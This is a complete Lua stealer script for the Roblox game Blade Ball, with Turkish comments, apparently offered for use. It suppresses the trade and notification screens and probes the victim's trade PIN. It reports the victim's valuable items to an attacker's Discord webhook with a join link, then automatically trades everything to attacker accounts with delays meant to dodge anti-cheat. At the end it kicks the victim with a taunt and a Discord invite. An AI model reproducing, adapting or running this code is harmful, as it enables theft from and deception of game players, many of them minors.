_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Yavaşlatılmış, BAC korumalı Blade Ball Stealer
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")

-- AFK koruması
plr.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- Değişkenler (kullanıcıdan alınacak)
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:Kick("You didn't add usernames or webhook")
    return
end

-- Oyun kontrolü
if game.PlaceId ~= 13772394625 then
    plr:Kick("Game not supported. Please join a normal Blade Ball server")
    return
end

-- Sunucu kontrolü
if #Players:GetPlayers() >= 16 then
    plr:Kick("Server is full. Please join a less populated server")
    return
end

-- VIP server kontrolü (hata almamak için pcall ile)
pcall(function()
    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
        plr:Kick("Server error. Please join a DIFFERENT server")
        return
    end
end)

-- Net modülü
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- PIN bypass (daha yumuşak)
task.wait(2)
local pinSuccess, pinResult = pcall(function()
    return netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({option = "PIN", value = "9079"})
end)

if pinSuccess and pinResult and pinResult ~= "You don't have a PIN code" then
    plr:Kick("Account error. Please disable trade PIN and try again")
    return
end

-- GUI'leri bul ve kapat
local PlayerGui = plr:WaitForChild("PlayerGui")
local tradeGui = PlayerGui:FindFirstChild("Trade")
local tradeCompleteGui = PlayerGui:FindFirstChild("TradeCompleted")
local notificationsGui = PlayerGui:FindFirstChild("Notifications")

if tradeGui then
    tradeGui.Enabled = false
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if tradeGui.Enabled then tradeGui.Enabled = false end
    end)
end

if tradeCompleteGui then
    tradeCompleteGui.Enabled = false
    tradeCompleteGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if tradeCompleteGui.Enabled then tradeCompleteGui.Enabled = false end
    end)
end

if notificationsGui then
    notificationsGui.Enabled = false
    notificationsGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if notificationsGui.Enabled then notificationsGui.Enabled = false end
    end)
end

-- Trade durum değişkeni
local inTrade = false
if tradeGui then
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        inTrade = tradeGui.Enabled
    end)
end

-- Envanter
local clientInventory
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult and rapDataResult.Data and rapDataResult.Data.Items or {}

-- Kategoriler
local categories = {"Sword", "Emote", "Explosion"}

-- Itemleri topla
local itemsToSend = {}
local totalRAP = 0

-- RAP map oluştur
local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function()
            return HttpService:JSONDecode(serializedKey)
        end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    nameToRAP[pair[2]] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do
    rapMappings[category] = buildNameToRAPMap(category)
end

-- Client envanteri al
pcall(function()
    clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
end)

if not clientInventory then
    plr:Kick("Failed to load inventory")
    return
end

-- Itemleri filtrele
for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category] or {}) do
        if not itemInfo.TradeLock then
            local itemName = itemInfo.Name
            local rap = (rapMappings[category] or {})[itemName] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {
                    ItemID = itemId,
                    RAP = rap,
                    itemType = category,
                    Name = itemName
                })
            end
        end
    end
end

if #itemsToSend == 0 then
    plr:Kick("No items found above min_rap")
    return
end

table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

-- Webhook fonksiyonları
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    if idx == 1 then
        return tostring(math.floor(number))
    else
        return string.format("%.2f%s", number, suffixes[idx])
    end
end

local function groupItems(list)
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {
                Name = item.Name,
                Count = 1,
                TotalRAP = item.RAP
            }
        end
    end
    local result = {}
    for _, g in pairs(grouped) do table.insert(result, g) end
    table.sort(result, function(a, b) return a.TotalRAP > b.TotalRAP end)
    return result
end

local function SendJoinMessage(list, prefix)
    local grouped = groupItems(list)
    local itemText = ""
    for _, g in ipairs(grouped) do
        itemText = itemText .. string.format("%s (x%s) - %s RAP\n", g.Name, g.Count, formatNumber(g.TotalRAP))
    end
    if #itemText > 1024 then
        itemText = itemText:sub(1, 1000) .. "\nPlus more!"
    end

    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        embeds = {{
            title = "🔴 Join to get Blade Ball hit",
            color = 65280,
            fields = {
                {name = "Victim Username:", value = plr.Name, inline = true},
                {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list:", value = itemText, inline = false},
                {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
            },
            footer = {text = "Blade Ball Stealer • BAC Bypass"}
        }}
    }
    pcall(function()
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end)
end

local function SendMessage(list)
    local grouped = groupItems(list)
    local itemText = ""
    for _, g in ipairs(grouped) do
        itemText = itemText .. string.format("%s (x%s) - %s RAP\n", g.Name, g.Count, formatNumber(g.TotalRAP))
    end
    if #itemText > 1024 then
        itemText = itemText:sub(1, 1000) .. "\nPlus more!"
    end

    local data = {
        embeds = {{
            title = "🔴 New Blade Ball Execution",
            color = 65280,
            fields = {
                {name = "Victim Username:", value = plr.Name, inline = true},
                {name = "Items sent:", value = itemText, inline = false},
                {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
            },
            footer = {text = "Blade Ball Stealer • BAC Bypass"}
        }}
    }
    pcall(function()
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end)
end

-- Trade fonksiyonları (yavaşlatılmış, random bekleme)
local function sendTradeRequest(user)
    local target = Players:FindFirstChild(user)
    if not target then return end
    local success, result = pcall(function()
        return netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    end)
    return success and result == true
end

local function addItemToTrade(itemType, ID)
    local success, result = pcall(function()
        return netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
    end)
    return success and result == true
end

local function readyTrade()
    local success, result = pcall(function()
        return netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    end)
    return success and result == true
end

local function confirmTrade()
    pcall(function()
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    end)
end

local function getNextBatch(items, batchSize)
    local batch = {}
    for i = 1, math.min(batchSize, #items) do
        table.insert(batch, table.remove(items, 1))
    end
    return batch
end

-- Token ekleme
local function addTokens()
    pcall(function()
        if tradeGui and tradeGui.Main and tradeGui.Main.Currency and tradeGui.Main.Currency.Coins and tradeGui.Main.Currency.Coins.Amount then
            local raw = tradeGui.Main.Currency.Coins.Amount.Text
            local cleaned = raw:gsub("[^%d]", "")
            local amount = tonumber(cleaned) or 0
            if amount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(amount)
            end
        end
    end)
end

-- Ana trade döngüsü
local function doTrade(joinedUser)
    local itemsCopy = {}
    for _, v in ipairs(itemsToSend) do table.insert(itemsCopy, v) end

    while #itemsCopy > 0 do
        local requestSent = false
        for attempt = 1, 10 do
            if sendTradeRequest(joinedUser) then
                requestSent = true
                break
            end
            task.wait(math.random(15, 25) / 10)
        end
        if not requestSent then break end

        local tradeStarted = false
        for waitCount = 1, 30 do
            if inTrade then
                tradeStarted = true
                break
            end
            task.wait(0.5)
        end
        if not tradeStarted then break end

        local batch = getNextBatch(itemsCopy, 50)
        for _, item in ipairs(batch) do
            for attempt = 1, 3 do
                if addItemToTrade(item.itemType, item.ItemID) then break end
                task.wait(math.random(10, 20) / 10)
            end
            task.wait(math.random(5, 10) / 10)
        end

        task.wait(1)
        addTokens()
        task.wait(math.random(5, 10) / 10)

        for attempt = 1, 5 do
            if readyTrade() then break end
            task.wait(math.random(10, 20) / 10)
        end

        task.wait(2)
        confirmTrade()

        for waitCount = 1, 30 do
            if not inTrade then break end
            task.wait(0.5)
        end
        task.wait(math.random(15, 25) / 10)
    end

    task.wait(2)
    plr:Kick("All your stuff just got stolen. discord.gg/GY2RVSEGDT")
end

-- Ana mesajı gönder
local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
SendJoinMessage(itemsToSend, prefix)

local sentItemsCopy = {}
for _, v in ipairs(itemsToSend) do table.insert(sentItemsCopy, v) end
local sentMessage = false

local function onUserJoin(player)
    if table.find(users, player.Name) then
        if not sentMessage then
            SendMessage(sentItemsCopy)
            sentMessage = true
        end
        task.wait(3)
        doTrade(player.Name)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    task.spawn(function() onUserJoin(p) end)
end

Players.PlayerAdded:Connect(function(p)
    task.spawn(function() onUserJoin(p) end)
end)
